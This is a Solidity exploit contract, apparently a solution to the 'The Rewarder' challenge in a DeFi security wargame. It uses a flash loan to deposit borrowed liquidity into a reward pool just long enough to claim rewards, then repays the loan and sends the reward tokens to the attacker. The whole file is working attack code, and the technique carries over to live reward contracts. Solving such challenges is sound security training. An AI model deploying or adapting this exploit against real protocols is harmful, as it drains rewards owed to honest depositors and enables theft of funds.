// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "solmate/src/tokens/ERC20.sol";

contract AttackRewarder {
    TheRewarderPool public rewarderPool;
    FlashLoanerPool public flashLoanerPool;
    RewardToken public rewardToken;
    ERC20 public liquidityToken;
    address public player;

    constructor(address rewarderPool_, address flashLoanerPool_, address liquidityToken_, address rewardToken_) {
        rewarderPool = TheRewarderPool(rewarderPool_);
        flashLoanerPool = FlashLoanerPool(flashLoanerPool_);
        liquidityToken = ERC20(liquidityToken_);
        rewardToken = RewardToken(rewardToken_);
        player = msg.sender;
    }

    function attack(uint256 amount) public {
        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external payable {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
    }
}
